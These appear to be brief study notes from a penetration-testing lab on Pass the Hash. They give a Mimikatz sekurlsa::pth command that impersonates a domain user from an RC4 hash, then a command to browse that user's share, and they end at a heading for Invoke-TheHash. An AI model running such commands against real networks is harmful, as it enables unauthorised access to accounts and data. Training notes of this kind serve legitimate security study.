### Tools used for Pass the Hash
#### Mimikatz
* ```bash
  mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
  ```
  * The goal is to impersonate `/user`, running on `/domain`, and using the `/rc4` hash.
  * Then running `dir \\dc0\julio` one can peek into the shares of julio 
#### Invoke-The Hash (Windows)